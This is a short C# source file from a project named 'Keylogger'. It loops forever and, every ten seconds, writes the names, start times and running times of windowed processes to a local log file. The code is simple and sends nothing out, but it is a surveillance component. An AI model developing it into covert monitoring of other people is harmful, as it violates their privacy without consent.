using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Keylogger
{
    public class Windowlogger
    {
       public static void GetRunningWindows()
        {
            while (true)
            {
                string fileName = "windowlog.log";
                using (StreamWriter sw = new StreamWriter(fileName, true))
                {
                    sw.WriteLine("Date & Time: " + DateTime.Now);
                    foreach (Process p in Process.GetProcesses())
                    {
                        if (!string.IsNullOrEmpty(p.MainWindowTitle))
                        {
                            sw.WriteLine("Process: " + p.ProcessName);
                            sw.WriteLine("Start Time: " + p.StartTime);
                            sw.WriteLine("Running Time: " + (DateTime.Now - p.StartTime));
                            sw.WriteLine("---------------------------");
                        }
                    }
                }
                Thread.Sleep(10000);
            }
        }
    }
}
